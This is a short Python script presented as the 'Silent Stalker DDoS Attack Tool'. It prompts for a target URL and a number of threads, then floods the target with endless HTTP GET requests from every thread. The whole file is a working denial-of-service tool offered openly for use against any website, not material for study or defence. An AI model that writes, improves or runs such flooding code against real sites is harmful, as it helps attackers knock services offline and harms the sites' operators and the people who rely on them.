import os
import requests
import threading
import time

running = True

def limpiar_pantalla():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def logo():
    limpiar_pantalla()
    print("  ____    ____  ")
    print(" / ___|  / ___| ")
    print("| |     | |     ")
    print(" \___ \  \___ \ ")
    print("  ___) |  ___) |")
    print(" |____/  |____/ \n")
    print("Silent Stalker\nDDoS Attack Tool\nBy: TheYoungHackerHa\n\nTo Stop The Tool Type Ctrl + Alt + C\n")

def enviar_solicitudes(url):
    while True:
        try:
            respuesta = requests.get(url)
            print(f"Request send, state: {respuesta.status_code}")
        except Exception as e:
            print(f"Error sending request: {e}")

def ataque_ddos(url, num_hilos):
    print(f"initiating DDoS attack on {url} with {num_hilos} threads")
    threads = []
    for _ in range(num_hilos):
        hilo = threading.Thread(target=enviar_solicitudes, args=(url,))
        threads.append(hilo)
        hilo.start()

    for hilo in threads:
        hilo.join()

    print("DDoS Attack FINISH")

def main():
    url = input(f"Enter the url: ")
    try:
        num_hilos = int(input(f"Enter the threads: "))
        ataque_ddos(url, num_hilos)
    except:
        print("Enter a valid num")
        
if __name__ == "__main__":
    logo()
    main()